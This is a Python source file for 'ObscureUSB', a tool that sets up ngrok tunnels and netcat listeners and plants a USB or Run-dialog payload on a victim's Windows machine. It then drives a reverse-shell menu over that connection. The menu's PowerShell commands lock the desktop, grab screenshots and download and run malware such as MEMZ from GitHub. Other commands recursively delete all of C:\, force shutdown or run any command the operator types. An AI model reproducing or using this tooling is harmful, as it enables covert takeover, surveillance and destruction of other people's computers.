"""Dependencies"""
import os
from subprocess import DEVNULL, run, check_output
import sys
from time import sleep
import json
import tempfile

"""Configuration and constants"""
LOCAL_PORTS = [1336, 1337]
THIS_DIRECTORY = (os.path.split(os.path.realpath(__file__))[0])
C_MARK = "\u001b[32m\u2713\u001b[90m"
X_MARK = "\u001b[31m\u2717\u001b[90m"
E_MARK = "\u001b[31m\u203c\u001b[90m"

"""Print ASCII name for Obscure"""
def print_name():
    print("\033[31m\n         __                            \n  ____  / /_  ____________  __________ \n / __ \\/ __ \\/ ___/ ___/ / / / ___/ _ \\\n/ /_/ / /_/ (__  ) /__/ /_/ / /  /  __/\n\\____/_.___/____/\\___/\\__,_/_/   \\___/ \n\033[0m")

"""Authenticate"""
if os.geteuid() == 0:
    print("\u001b[31mDo not run as root!")
    sys.exit()
run(["clear"])
print_name()
print("\u001b[34mAuthenticating...\033[0m")
run(["sudo", "echo", "\033[32mReady!\n\033[90m"])

"""Check tmux pane for connection info to determine if a connection has been established"""
def check_for_connection(first_port):
    connection_established = False
    pane_capture = None
    try:
        pane_capture = check_output(["tmux", "capture-pane", "-pt", f"listener-{first_port}"], stderr=DEVNULL).decode("utf-8")
    except:
        return False

    last_listening = pane_capture.lower().rfind("listening on")
    last_connection = pane_capture.lower().rfind("connection received")

    if last_listening <= last_connection and pane_capture is not None: # ensure that a connection is still ongoing
        connection_established = True

    return connection_established

"""Create a new session to connect the target to the attacker's machine"""
def make_new_session():
    """Clear previous sessions"""
    run(["tmux","kill-server"], stderr=DEVNULL)
    print(f"{C_MARK} Cleared previous panes.")

    """Ask to start new session"""
    print("\u001b[33mInitiate a new session?\u001b[90m (Y/N)\u001b[0m", end=" ")
    response = input().strip().lower()
    if response != "y":
        print(f"{X_MARK} Session initiation cancelled.")
        sys.exit()
    print("\u001b[90m",end="")

    """Allow ports on local firewall"""
    for port in LOCAL_PORTS:
        check_output(["sudo", "ufw", "allow", str(port)], stderr=DEVNULL)
    print(f"{C_MARK} Modified local firewall.")

    """Start new sessions"""
    for port in LOCAL_PORTS:
        run(["tmux", "new-session", "-d", "-s", f"ngrok-tcp-{port}"])
        run(["tmux", "send-keys", "-t", f"ngrok-tcp-{port}", f"ngrok tcp {port}", "ENTER"])
    print(f"{C_MARK} Started ngrok tunnels.")

    """Gather tunnel information"""
    tunnels_exist = False
    tunnels = []
    while not tunnels_exist:
        try:
            tunnels = []
            for i in range(len(LOCAL_PORTS)): # Read tunnel information for each port
                tunnels.append(check_output(f"curl http://127.0.0.1:{4040+i}/api/tunnels", shell=True, stderr=DEVNULL).decode("utf-8"))
            tunnels_exist = True
        except:
            sleep(1) # Wait for tunnels to be established and information to be available before proceeding
    print(f"{C_MARK} Retrieved tunnel information.")

    """Parse tunnel information"""
    tunnel_data = []
    for tunnel in tunnels: # Parse tunnel information from JSON output
        tunnel_data.append(json.loads(tunnel))

    middlemen = {}
    for tunnel in tunnel_data: # Extract middleman information for each tunnel
        middlemen[tunnel["tunnels"][0]["config"]["addr"].split(":")[1]] = tunnel["tunnels"][0]["public_url"].split("://")[1]
    print(f"{C_MARK} Parsed tunnel information.")

    """Begin listening on local ports"""
    for i,port in enumerate(LOCAL_PORTS):
        run(["tmux", "new-session", "-d", "-s", f"listener-{port}"])
        if i == 1: # If the second port, set up listener to capture screenshot
            run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -q 0 -lvnp {port} > out/capture.png; feh -x out/capture.png --geometry 1200x800+10-10 -. -Z --image-bg black; sleep 1; done", "ENTER"])
        else: # Otherwise, set up normal listener
            run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -lvnp {port}; sleep 1; done", "ENTER"])
    print(f"{C_MARK} Began listening on local ports.")

    """Generate first paste"""
    with open(f"{THIS_DIRECTORY}/dev/paste_01.txt", "r") as f:
        paste1 = f.read()
        f.close()

    first_port = LOCAL_PORTS[0]
    first_tcp = middlemen[str(first_port)]
    paste1 = paste1.replace(">>TCP<<", first_tcp.split(":")[0])
    paste1 = paste1.replace(">>PORT<<", first_tcp.split(":")[1])
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(paste1.encode("utf-8"))
        tmp.flush()
        paste1_url = check_output(f"curl -F 'content=<{tmp.name}' https://dpaste.com/api/v2/", shell=True, stderr=DEVNULL)
        paste1_url = paste1_url.decode("utf-8").strip().split("://")[1] + ".txt"

    print(f"{C_MARK} Uploaded first dpaste.")

    sleep(1)

    """Generate second paste"""
    with open(f"{THIS_DIRECTORY}/dev/paste_02.txt", "r") as f:
        paste2 = f.read()
        f.close()

    second_port = LOCAL_PORTS[1]
    second_tcp = middlemen[str(second_port)]
    paste2 = paste2.replace(">>TCP<<", second_tcp.split(":")[0])
    paste2 = paste2.replace(">>PORT<<", second_tcp.split(":")[1])
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(paste2.encode("utf-8"))
        tmp.flush()
        paste2_url = check_output(f"curl -F 'content=<{tmp.name}' https://dpaste.com/api/v2/", shell=True, stderr=DEVNULL)
        paste2_url = paste2_url.decode("utf-8").strip().split("://")[1] + ".txt"

    print(f"{C_MARK} Uploaded second dpaste.")

    sleep(1)

    """Generate main paste"""
    with open(f"{THIS_DIRECTORY}/dev/paste_00.txt", "r") as f:
        paste0 = f.read()
        f.close()
    paste0 = paste0.replace(">>URL1<<", paste1_url)
    paste0 = paste0.replace(">>URL2<<", paste2_url)
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(paste0.encode("utf-8"))
        tmp.flush()
        paste0_url = check_output(f"curl -F 'content=<{tmp.name}' https://dpaste.com/api/v2/", shell=True, stderr=DEVNULL)
        paste0_url = paste0_url.decode("utf-8").strip().split("://")[1] + ".txt"

    print(f"{C_MARK} Uploaded main dpaste.")

    """Write USB scripts"""
    with open(f"{THIS_DIRECTORY}/config_usb.txt", "r") as f:
        config_usb = f.read().strip()
        f.close()

    with open(f"{THIS_DIRECTORY}/dev/manual.txt", "r") as f:
        manual_run = f.read().strip()
        f.close()

    with open(f"{THIS_DIRECTORY}/dev/usb.txt", "r") as f:
        usb_template = f.read()
        f.close()

    if config_usb != "MANUAL": # Default mode, writing to USB

        print("\u001b[34mInsert USB and press Enter.\u001b[90m",end=" ")
        wait = input()

        """Attempt to write scripts to USB, retrying on failure"""
        successfully_wrote = False
        error_count_write = 0
        error_count_eject = 10
        while not successfully_wrote:
            try:
                with open(f"{config_usb}", "w") as f:
                    f.write(usb_template.replace(">>URL<<", paste0_url)) # Write to USB
                successfully_wrote = True # Successfully wrote to USB without error, exit loop
            except Exception as e: # Failed to write to USB
                if error_count_write > 0:
                    print("\033[A\033[K",end="")
                error_count_write += 1
                print(f"{X_MARK} Error writing to USB... trying again. [{error_count_write}]")
                if error_count_write >= error_count_eject:
                    print(f"{X_MARK} Failed to write to USB after {error_count_eject} attempts.")
                    sys.exit() # Exit if too many failed attempts to write to USB
            sleep(2)

        print(f"{C_MARK} Scripts wrote to USB.")
        print("\n\u001b[34mRemove the USB and insert it into the victim's machine.\u001b[90m")
    
    else: # Manual mode
        """If manual mode configured, print the script for the user to copy onto Windows Run dialog themselves"""
        print("\n\u001b[34mManual mode specified, not writing to USB. Type the script below onto the target machine's Run dialog. Once typed into the field, use CTRL + SHIFT + ENTER to run with full privileges.\u001b[90m\n")
        print("\u001b[0m" + manual_run.replace(">>URL<<", paste0_url) + "\n")

    """Wait for connection"""
    print("\u001b[33mWaiting for connection to target...\u001b[90m")

    connection_established = False
    while not connection_established: # Loop until connection info is found in tmux pane, indicating a successful connection from the target
        pane_capture = check_output(["tmux", "capture-pane", "-pt", f"listener-{first_port}"]).decode("utf-8")
        if "connection received" in pane_capture.lower():
            connection_established = True
            continue
        sleep(1)

    create_interface(True) # Once connection is established, create interface for user to interact with target

"""Create an interface for the user to interact with the target"""
def create_interface(now_established=False):

    """Initiate a structure for all user actions"""
    options = {
        "Create a pop-up": {"TEXT": "Start-Job -ScriptBlock {(New-Object -ComObject Wscript.Shell).Popup('>>TEXT<<',8,'Critical Alert',0x40)}"},
        
        "Type to keyboard": {"TEXT": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('>>TEXT<<')"},
        
        "Jitter cursor rapidly": "Start-Job -ScriptBlock {Add-Type -AssemblyName System.Windows.Forms; $Cursor = [system.windows.forms.cursor]::Clip; [System.Reflection.Assembly]::LoadWithPartialName('system.windows.forms'); for ($i=1;$i -lt 19999;$i++) { $Position = [system.windows.forms.cursor]::Position; $PositionChange = Get-Random 20; switch (Get-Random 4) { 0 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point($Position.x, ($Position.y + $PositionChange))} 1 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(($Position.x + $PositionChange),$Position.y)} 2 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point($Position.x, ($Position.y - $PositionChange))} 3 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(($Position.x - $PositionChange),$Position.y)}} }}",
        
        "Manage files": {
            "Lock file system": "Start-Job -ScriptBlock {Add-Type -AssemblyName System.Windows.Forms; $Cursor = [system.windows.forms.cursor]::Clip; [System.Reflection.Assembly]::LoadWithPartialName('system.windows.forms'); while('$true') {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(9999,9999); Stop-Process -Name 'taskmgr' -Force;}}; Stop-Process -Name 'taskmgr' -Force; Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Stop-Process -Force; Start-Sleep -Milliseconds 100; taskkill /F /IM explorer.exe; Start-Sleep -Milliseconds 10",
            "Unlock file system": "start explorer; Get-Job | Stop-Job; Get-Job | Remove-Job -Force"
        },

        "Capture screenshot": (
            "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Keyboard' -Name 'PrintScreenKeyForSnippingEnabled' -Value 00000000; $proc = Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -Command \"C:\\win64\\init_ds.bat\"' -PassThru; Start-Sleep -Seconds 3; $mpid = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 -ExpandProperty Id",
            "pkill -f feh",
            "Screenshot was saved to out/capture.png."
        ),
        
        "Configure malware": {
            "Salinewin.exe": {
                "Install (non-destructive, purely effects)": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/saline/main/salinewin1.5-safety.exe' -OutFile 'C:\\win64\\saline.exe'; Start-Process 'C:\\win64\\saline.exe' -WindowStyle hidden",
                "Stop": "Get-Process 'saline' | Stop-Process -Force"
            },
            "Memz.exe": {
                "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\memz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/memz/main/MEMZ.exe' -OutFile 'C:\\win64\\memz.exe'; Start-Process 'C:\\win64\\memz.exe' -WindowStyle hidden",
                "Stop": "Get-Process 'memz' | Stop-Process -Force"
            },
            "ButterflyOnDesktop.exe": {
                "Install (non-destructive, but closed source)": "if(Test-Path 'C:\\win64\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\win64\\bfly.exe'}}else{Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/butterfly/main/bfly.exe' -OutFile 'C:\\win64\\bfly.exe'; Start-Process 'C:\\win64\\bfly.exe' -WindowStyle hidden}",
                "Stop": "Get-Process 'bfly' | Stop-Process -Force"
            }
        },

        "Open camera": "Start-Process microsoft.windows.camera: -WindowStyle hidden",

        "Wipe machine": {
            "Confirm \u001b[31m(will erase everything)\u001b[90m": (
                "Start-Job -Script-Block {Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse}",
                "",
                "Connection will remain until target device reboots."
            )
        },

        "Shut down machine": {
            "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
                "Get-ChildItem -Path C:\\win64\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Stop-Computer -Force",
                "",
                "<ENDOF_CONNECTION>"
            )
        },

        "Run custom command": {
            "TEXT": (
                ">>TEXT<<",
                "",
                "?CAPTURED_TMUX"
            )
        },

        "Break connection": {
            "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
                "Get-ChildItem -Path C:\\win64\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Get-Process powershell | Stop-Process -Force",
                "",
                "<ENDOF_CONNECTION>"
            )
        }
    }

    """Use print statements and input to create a navigable interface"""
    continue_commands = True
    command_sent = False
    command_info = ""
    show_connect_info = now_established
    while continue_commands:

        current = options # Start at the top level of options
        queued_command = ""

        while type(current) is dict: # Loop through option structure until a command is reached

            run(["clear"]) # Clear screen for better readability
            print("\u001b[34m[ ObscureUSB - Reverse Shell Menu ]\u001b[90m\n")

            if(show_connect_info): # Show connection message once upon initial connection, then disable for better readability of interface
                show_connect_info = False
                print(f"{C_MARK} \u001b[32mConnection established!\n\u001b[90m")
                sleep(1)

            if current == options: # If at the top level, perform checks
                
                if command_sent:

                    if(not check_for_connection(LOCAL_PORTS[0])): # Ensure connection is still active before displaying command success, otherwise prompt for new session
                        print("\u001b[31mConnection lost! Restarting...\u001b[90m")
                        sleep(3)
                        run(["clear"])
                        print_name()
                        return

                    print("\u001b[32mCommand sent successfully!\u001b[90m")
                    if command_info != "":
                        print(f"\u001b[32m{command_info}\u001b[90m\n") # Display any relevant info about the sent command
                    else:
                        print()
                    command_sent = False
                    command_info = ""

            """Handle text input options"""
            if('TEXT' in current):
                print("\u001b[34mInput text for selected option")
                print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
                valid_input = False
                while not valid_input:
                    user_input = input() # User types in text for the option, or back or exit
                    if user_input.lower() == "exit": # Handle exit
                        print("\n\u001b[90mExited, though the connection is likely still active.\n\u001b[90mReopen the connection by running Obscure again.")
                        sys.exit()
                    if user_input.lower() == "back": # Handle back
                        current = options
                        valid_input = True
                        run(["clear"])
                        continue
                    if user_input.strip() != "": # Handle valid
                        valid_input = True
                        current = current[list(current.keys())[0]]
                        if type(current) is tuple:
                            queued_command = (current[0].replace(">>TEXT<<", user_input), current[1], current[2])
                        else:
                            queued_command = current.replace(">>TEXT<<", user_input)
                    else: # Handle invalid
                        print("\033[A\033[K"*3,end="")
                        print("\u001b[34mInput text for selected option.",end=" ")
                        print("\u001b[31m(CANNOT BE EMPTY)\u001b[90m")
                        print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
                continue

            """Handle regular options"""
            for i, option in enumerate(current.keys()): # List all possible options at the current level
                s = "   " if i < 9 else "  " # Adjust spacing for digit count
                print(f"{s}\u001b[33m[{i+1}]\u001b[0m {option}\u001b[90m")

            if current == options:
                print("\n\u001b[34mSelect an option to interact with the target.")
                print("\u001b[90mType 'exit' to quit.\u001b[0m")
            else:
                print("\n\u001b[34mSelect an action to execute on the target.")
                print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
            valid_choice = False
            while not valid_choice:
                choice = input().lower() # User selects an option by number, or types back or exit
                if choice == "exit": # Handle exit
                    print("\n\u001b[90mExited, though the connection is likely still active.\n\u001b[90mReopen the connection by running Obscure again.")
                    sys.exit()
                if choice == "back" and current != options: # Handle back
                    current = options
                    valid_choice = True
                    run(["clear"])
                    continue
                if choice.isdigit() and 1 <= int(choice) <= len(options): # Handle valid
                    valid_choice = True
                    current = current[list(current.keys())[int(choice)-1]]
                    if type(current) is not dict:
                        queued_command = current
                else: # Handle invalid
                    if current == options:
                        print("\033[A\033[K"*4,end="")
                        print("\n\u001b[34mSelect an option to interact with the target.",end=" ")
                        print("\u001b[31m(SELECT NUMBER)\u001b[90m")
                        print("\u001b[90mType 'exit' to quit.\u001b[0m")
                    else:
                        print("\033[A\033[K"*4,end="")
                        print("\n\u001b[34mSelect an action to execute on the target.", end=" ")
                        print("\u001b[31m(SELECT NUMBER)\u001b[90m")
                        print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
        
        """Once a command is selected, execute it on the target through tmux and nc"""
        print("\n\u001b[33mExecuting command on target...\u001b[90m")
        
        if type(queued_command) is tuple: # Execute complex command
            
            run(queued_command[1], shell=True) # Run any local commands necessary for the option
            run(["tmux", "send-keys", "-t", f"listener-{LOCAL_PORTS[0]}", queued_command[0], "ENTER"]) # Run the selected command on the target
            
            if queued_command[2] == "?CAPTURED_TMUX": # Display reverse shell if needed
                rev_capture_init = "\u001b[90m" + check_output(["tmux", "capture-pane", "-pt", f"listener-{LOCAL_PORTS[0]}"]).decode("utf-8")
                rev_capture = rev_capture_init
                rev_attempts = 0
                rev_different = False
                sleep(1)
                while(not rev_different and rev_attempts < 5): # Loop until tmux output changes
                    rev_capture = "\u001b[90m" + check_output(["tmux", "capture-pane", "-pt", f"listener-{LOCAL_PORTS[0]}"]).decode("utf-8")
                    if(rev_capture != rev_capture_init):
                        rev_different = True
                    if(rev_attempts != 0):
                        print("\033[A\033[K",end="")
                        print(f"\u001b[33mRetrieving command output... \u001b[90m[{rev_attempts}]")
                    else:
                        print(f"\u001b[33mRetrieving command output...")
                    rev_attempts += 1
                    sleep(1)
                rev_capture = rev_capture.replace("\n\n", "\n").strip() + "\u001b[0m"
                command_info = "\u001b[90m\n" + '\n'.join(rev_capture.splitlines()[-10:]) + "\n\u001b[90m[...]"
            
            elif "<ENDOF_CONNECTION>" in queued_command[2]: # If the command has an end of connection message, exit
                command_info = queued_command[2].replace("<ENDOF_CONNECTION>", "")
                print(f"{C_MARK} Connection broken!")
                sleep(1)
                run(["tmux","kill-server"], stderr=DEVNULL)
                sys.exit()
            else:
                command_info = queued_command[2]
        
        else: # Execute simple command
            run(["tmux", "send-keys", "-t", f"listener-{LOCAL_PORTS[0]}", queued_command, "ENTER"]) # Run the selected command on the target
        command_sent = True

def main():
    """Check for valid existing sessions"""
    allow_new_sessions = True
    connection_established = check_for_connection(LOCAL_PORTS[0])
    if not connection_established:
        print("\u001b[90mNo existing, active sessions found.")
    if connection_established:
        print("\u001b[34mExisting session with active connections found!\u001b[90m")
        print("\u001b[33mDo you wish to reconnect to this session? \u001b[90m(Y/N)\u001b[0m", end=" ")
        choice = input().lower()
        print("\u001b[90m",end="")
        if choice == "y":
            create_interface()
    while allow_new_sessions:
        make_new_session()

if __name__ == "__main__":
    main()